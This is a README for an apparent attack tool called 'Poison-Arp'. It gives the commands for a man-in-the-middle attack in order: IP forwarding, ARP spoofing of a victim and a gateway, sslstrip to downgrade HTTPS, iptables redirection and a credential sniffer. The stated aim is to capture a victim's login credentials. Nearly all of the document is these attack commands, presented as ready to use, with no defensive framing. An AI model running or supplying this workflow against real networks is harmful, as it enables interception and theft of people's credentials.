# Poison-Arp

This is tool can poison the Arp table of the victim as well as router and sniff all the credentials of the victim.It works with HTTP as well as HTTPS but not with HSTS.

Step 1:- Allow traffic to pass through the Hacker machine with the below command 

$ echo 1 > /proc/sys/net/ipv4/ip_forward

![](/images/traffic_bypass.png)


Step 2:- Now run the arp-spoofer  with the below command 

$ python3 arp_spoofer.py --gateway  ap_ip --target victim_ip

![](/images/spoof.png)

Step 3: Run the sslstrip with the below command

$ sslstrip

![](/images/ssltrip.png)

Step 4: forward all the traffic to sslstrip port using iptables with the following command 

$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000 

![](/images/iptables.png)


Step 5: Run the sniffer with the following command

$ python3 sniffer.py -i interface

![](/images/login_new.png)








